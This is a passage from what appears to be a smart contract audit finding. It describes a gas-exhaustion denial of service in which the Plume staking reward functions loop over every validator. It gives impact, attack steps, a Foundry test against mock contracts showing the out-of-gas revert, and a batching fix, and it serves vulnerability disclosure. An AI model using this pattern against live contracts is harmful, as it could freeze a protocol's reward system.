        PlumeRewardLogic.createRewardRateCheckpoint($, token, validatorId, initialRate);
    }
    // ...
}
```

## Impact
Core reward management functions will become unusable as the number of validators grows, preventing the team from adding new rewards, removing old ones, or adjusting rates. This can severely disrupt the protocol's incentive mechanism and its ability to adapt.

## Proof of Concept
1. The protocol operates successfully and attracts a large number of validators (e.g., 2,000).
2. The administrator (with `REWARD_MANAGER_ROLE`) needs to add a new reward token by calling `addRewardToken`.
3. The transaction attempts to loop through all 2,000 validators, performing storage writes for each one.
4. The total gas required exceeds the block gas limit, causing the transaction to revert.
5. The administrator is now permanently blocked from adding new reward tokens, effectively freezing the reward system's evolution.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";

// Simplified storage to mimic the necessary parts of PlumeStakingStorage
contract MockStorage {
    uint16[] public validatorIds;

    function addValidator(uint16 id) public {
        validatorIds.push(id);
    }
}

// A minimal contract demonstrating the vulnerable pattern
contract VulnerableRewardsFacet {
    MockStorage public s;

    constructor(address storageAddress) {
        s = MockStorage(storageAddress);
    }

    // Simplified version of the vulnerable function
    function addRewardToken() public {
        uint16[] memory _validatorIds = s.validatorIds();
        for (uint i = 0; i < _validatorIds.length; i++) {
            // Simulate a storage write for each validator
            bytes32 slot = keccak256(abi.encodePacked("checkpoint", _validatorIds[i]));
            uint256 value = block.timestamp;
            assembly {
                sstore(slot, value)
            }
        }
    }
}

contract GasGriefTest is Test {
    VulnerableRewardsFacet facet;
    MockStorage storageContract;

    function setUp() public {
        storageContract = new MockStorage();
        facet = new VulnerableRewardsFacet(address(storageContract));
    }

    function test_DoS_addRewardToken_with_many_validators() public {
        // Arrange: Add a large number of validators to storage
        // The number 1500 is chosen as it's likely to exceed typical block gas limits
        // when combined with the SSTORE cost per loop iteration.
        uint16 numValidators = 1500;
        for (uint16 i = 0; i < numValidators; i++) {
            storageContract.addValidator(i);
        }

        // Act & Assert: The call to addRewardToken is expected to revert due to out-of-gas.
        // An out-of-gas revert does not have a specific error message.
        vm.expectRevert();
        facet.addRewardToken();
    }
}
```

## Suggested Mitigation
Refactor the vulnerable functions to support batch processing. Instead of updating all validators in a single transaction, introduce functions that allow administrators to process a subset of validators at a time. This gives them control over the gas consumption per transaction.

Example for mitigation:
```solidity
function addRewardTokenBatch(
    address token,
    uint256 initialRate,
    uint256 maxRate,
    uint256 startIndex,
    uint256 endIndex
) external onlyRole(PlumeRoles.REWARD_MANAGER_ROLE) {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    uint256 validatorCount = $.validatorIds.length;
    require(startIndex < endIndex, "Invalid range");
    require(endIndex <= validatorCount, "End index out of bounds");

    // Initial setup for the token if it's the first batch (startIndex == 0)
    if (startIndex == 0) {
        // ... perform initial checks and token setup ...
    }
```
